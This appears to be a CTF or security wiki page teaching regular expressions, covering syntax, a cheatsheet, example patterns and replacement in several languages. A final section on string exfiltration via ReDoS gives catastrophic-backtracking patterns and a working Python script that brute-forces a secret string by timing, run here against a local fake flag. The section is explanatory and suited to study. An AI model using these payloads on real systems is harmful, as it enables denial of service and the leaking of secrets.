---
description: >-
  Regular Expressions are a syntax for writing patterns to match for. Lot of
  symbols mean something allowing you to write complex rules in a very short
  string
---

# Regular Expressions (RegEx)

## Description

Regular Expressions (RegEx) are a way of writing patterns that many languages understand. Almost every language has some library or way to work with regular expressions, and they are really useful for quickly finding something.&#x20;

The syntax for RegEx may be hard to read at first. There is not really a way to make comments, and they are supposed to be very compact. But after working with them for a bit and understanding all the rules, you can quickly understand what a RegEx does. One great site that I always use for testing and creating Regular Expressions is RegExr:

{% embed url="https://regexr.com/" %}
A site to create, explain and test Regular Expressions
{% endembed %}

Another useful tool to visualize RegExes is [Regexper](https://regexper.com/). Just put a RegEx in there, and you'll get a nice image that explains the patterns, groups, etc.

### Where can I use them?

Many languages have some library or native way to interpret Regular Expressions. Here are two examples:

{% code title="Python" %}
```python
import re  # Import the Regular Expression library

regex = r'ab+c'  # Regex with r'' (raw) string to ignore \ escaping
s = "some text containing abbbbc to match"

print(re.findall(regex, s))  # ['abbbbc']
```
{% endcode %}

{% code title="JavaScript" %}
```javascript
const regex = /ab+c/;  // Define with / around pattern
s = "some text containing abbbbc to match";

console.log(regex.exec(s));  // ['abbbbc', index: 21, input: 'some text containing abbbbc to match', groups: undefined]
```
{% endcode %}

{% code title="PHP" %}
```php
<?php
$regex = '/ab+c/';  // Define in string with / around pattern
$s = "some text containing abbbbc to match";
preg_match($regex, $s, $matches);
print_r($matches);  // array(1) {[0] => string(6) "abbbbc"}
```
{% endcode %}

To search through files or command output with these regular expressions, you can use [grep.md](../forensics/grep.md "mention") which supports advanced regular expressions using the `-P` option (and use `'` single quotes to avoid escaping issues).&#x20;

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ grep -P 'ab+c' /etc/passwd
</strong>abbbbc:1000:1000:,,,:/home/abbbbc:/bin/bash
</code></pre>

Lots of code editors (IDEs) also allow you to search through your code using regular expressions. This can be really powerful in combination with the [#replacing](regular-expressions-regex.md#replacing "mention") feature to transform a pattern in your code without doing everything by hand. You can often enable this feature by clicking a `.*` button.&#x20;

```regex
Find:    'a(b+)c'
Replace: 'd$1e'
```

{% code title="Result" %}
```bash
some text containing abbbbc to match  # Before
some text containing dbbbbe to match  # After
```
{% endcode %}

### Rules/Cheatsheet

The [MDN web docs](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular\_Expressions) have some detailed explanations of all the special characters RegEx uses, so check those out to fully understand it from the ground up. If you're already a bit familiar with how RegEx works, here's a list of all the special characters and what they do:

<table><thead><tr><th width="242">Character classes</th><th> </th></tr></thead><tbody><tr><td><code>.</code></td><td>Any character except newline</td></tr><tr><td><code>\w</code> <code>\d</code> <code>\s</code></td><td>Word, digit, whitespace</td></tr><tr><td><code>\W</code> <code>\D</code> <code>\S</code></td><td>Not word, digit, whitespace</td></tr><tr><td><code>[abc]</code></td><td>Any of a, b, or c</td></tr><tr><td><code>[^abc]</code></td><td>Not a, b, or c</td></tr><tr><td><code>[a-g]</code></td><td>Character between a &#x26; g</td></tr></tbody></table>

<table><thead><tr><th width="243">Anchors</th><th> </th></tr></thead><tbody><tr><td><code>^abc$</code></td><td>Start / end of the string</td></tr><tr><td><code>\b</code> <code>\B</code></td><td>Word, not-word boundary</td></tr></tbody></table>

<table><thead><tr><th width="244">Escaped characters</th><th> </th></tr></thead><tbody><tr><td><code>\.</code> <code>\*</code> <code>\\</code></td><td>Escaped special characters</td></tr><tr><td><code>\t</code> <code>\n</code> <code>\r</code></td><td>Tab, linefeed, carriage return</td></tr></tbody></table>

<table><thead><tr><th width="245">Groups &#x26; Lookaround</th><th> </th></tr></thead><tbody><tr><td><code>(abc)</code></td><td>Capture group</td></tr><tr><td><code>\1</code></td><td>Backreference to group #1</td></tr><tr><td><code>(?:abc)</code></td><td>Non-capturing group</td></tr><tr><td><code>(?=abc)</code></td><td>Positive lookahead</td></tr><tr><td><code>(?!abc)</code></td><td>Negative lookahead</td></tr></tbody></table>

<table><thead><tr><th width="245">Quantifiers &#x26; Alternation</th><th> </th></tr></thead><tbody><tr><td><code>a*a+a?</code></td><td>0 or more, 1 or more, 0 or 1</td></tr><tr><td><code>a{5}a{2,}</code></td><td>Exactly five, two or more</td></tr><tr><td><code>a{1,3}</code></td><td>Between one &#x26; three</td></tr><tr><td><code>a+?a{2,}?</code></td><td>Match as few as possible</td></tr><tr><td><code>ab|cd</code></td><td>Match ab or cd</td></tr></tbody></table>

### Examples

```regex
32 hex characters:      [0-9a-f]{32}
Website URL:            https?:\/\/(www\.)?[-a-zA-Z0-9@:%._\+~#=]{2,256}\.[a-z]{2,4}\b([-a-zA-Z0-9@:%_\+.~#?&//=]*)
Valid IPv4 Address:     (25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)
Simple Email address:   [A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}
RFC Email address:      (?:[a-z0-9!#$%&'*+/=?^_`{|}~-]+(?:\.[a-z0-9!#$%&'*+/=?^_`{|}~-]+)*|"(?:[\x01-\x08\x0b\x0c\x0e-\x1f\x21\x23-\x5b\x5d-\x7f]|\\[\x01-\x09\x0b\x0c\x0e-\x7f])*")@(?:(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z0-9](?:[a-z0-9-]*[a-z0-9])?|\[(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?|[a-z0-9-]*[a-z0-9]:(?:[\x01-\x08\x0b\x0c\x0e-\x1f\x21-\x5a\x53-\x7f]|\\[\x01-\x09\x0b\x0c\x0e-\x7f])+)\])
Floating-point numbers: ^[-+]?[0-9]*.?[0-9]+([eE][-+]?[0-9]+)?$
```

## Replacing

Regular Expressions can also be used to replace matches with something. Using groups with `()` around parts of the pattern, you can even include groups back in the replacement. This is really useful for changing specific things around or in your pattern, without doing it manually. Here are the variables you can use in the replacement string:

* `$&`: Full match
* `$1`: First group
* `$2`: Second group
* etc.

You can use the `$&` anywhere in your replacement string to insert the full match. This is useful if you want to add some characters around the match, instead of changing it. You can also get any groups with `$n`, where `n` is the number of the group in your search pattern.&#x20;

Some implementations of RegEx have a little different syntax for these replacements, Python's [`re.sub`](https://docs.python.org/3/library/re.html#re.sub) for example, uses the `\1` backslash instead of the `$1` dollar sign.&#x20;

### Code examples

{% code title="Python" %}
```python
import re

search = r'a(b+)c'  # Find a series of b's in between a and c
replace = r'd\1e'  # Replace match with b's in between d and e
string = "some text containing abbbbc to match"

print(re.sub(search, replace, string))  # "some text containing dbbbbe to match"

# You can also define a function to transform the match
def uppercase(s):
    return s.group(0).upper()  # Group 0 is whole match

print(re.sub(search, uppercase, string))  # "some text containing ABBBBC to match"
```
{% endcode %}

{% code title="JavaScript" %}
```javascript
const search = /a(b+)c/;
const replace = 'd$1e';
const string = "some text containing abbbbc to match";

console.log(string.replace(search, replace));  // "some text containing dbbbbe to match"

// You can also define a function to transform the match
function uppercase(s) {
    return s.toUpperCase();
}

console.log(string.replace(search, uppercase));  // "some text containing ABBBBC to match"
```
{% endcode %}

{% code title="PHP" %}
```php
<?php
$search = '/a(b+)c/';
$replace = 'd$1e';
$string = "some text containing abbbbc to match";

var_dump(preg_replace($search, $replace, $string));  // string(36) "some text containing dbbbbe to match"
```
{% endcode %}

## String Exfiltration via ReDoS

ReDoS stands for "Regular Expression Denial of Service". It is when you have such a computationally expensive search pattern, that the system takes a bit of time before returning the result. This can be used to slow down a system, causing Denial of Service. But it can also leak something about the string being matched, because some strings will parse faster than others.&#x20;

If you have control over the Regular Expression, and some secret string is being matched by your RegEx, you could use this to create a RegEx that will be very slow if the first character is an "A", but very fast if the first character is not an "A". Then you can slowly brute-force the secret string character by character.&#x20;

Such a pattern would be:

```regex
<text>(((((.*)*)*)*)*)!
or
(?=<text>).*.*.*.*.*.*.*.*!!!!
```

A smart regex parser would first look if the string starts with `<text>`, and if it does not, it stops instantly because it knows it will never match. Then if it does start with `<text>`, it will evaluate the rest of the `(((((.*)*)*)*)*)!` which is the computationally expensive part. That way we know that the string being matched starts with `<text>` if the application takes long to respond.&#x20;

Now we can try every possible letter in the place of \<text> until the application hangs. Then we save the newly found character and brute-force the next character, etc. See an example implementation I made in Python below:

```python
from functools import wraps
import errno
import os
import signal
import re

ALPHABET = list(b" {}_Ee3Aa@4RrIi1Oo0Tt7NnSs25$LlCcUuDdPpMmHhGg6BbFfYyWwKkVvXxZzJjQq89-,.!?'\"\n\r#%&()*+/\\:;<=>[]^`|~")  # Most common

# https://stackoverflow.com/a/2282656/10508498
class TimeoutError(Exception):
    pass

def timeout(seconds=10, error_message=os.strerror(errno.ETIME)):
    def decorator(func):
        def _handle_timeout(signum, frame):
            raise TimeoutError(error_message)

        def wrapper(*args, **kwargs):
            signal.signal(signal.SIGALRM, _handle_timeout)
            signal.setitimer(signal.ITIMER_REAL,seconds) #used timer instead of alarm
            try:
                result = func(*args, **kwargs)
            finally:
                signal.alarm(0)
            return result
        return wraps(func)(wrapper)
    return decorator


@timeout(0.1)
def match(regex):  # Target function
    re.match(regex, "CTF{f4k3_fl4g_f0r_t3st1ng}")


def attack():
    leaked = b""
    
    while True:
        for letter in ALPHABET:
            prefix = re.escape(leaked + bytes([letter])).decode()
            # regex = rf"{prefix}(((((((((((((.*)*)*)*)*)*)*)*)*)*)*)*)*)!"  # Doesn't get last byte
            regex = rf"(?={prefix}).*.*.*.*.*.*.*.*.*.*.*.*.*.*.*!!!!"  # Also gets last byte
            try:
                match(regex)
            except TimeoutError:
                leaked += bytes([letter])
                print(leaked)
                break
        else:
            break
        
    return leaked


print(attack())  # b'CTF{f4k3_fl4g_f0r_t3st1ng}'
```

## Solving & Finding Bypasses

For finding bypasses and edge cases or true values for a Regular Expression, check out the [#crosshair-regex-and-more](../cryptography/custom-ciphers/z3-solver.md#crosshair-regex-and-more "mention") solver.
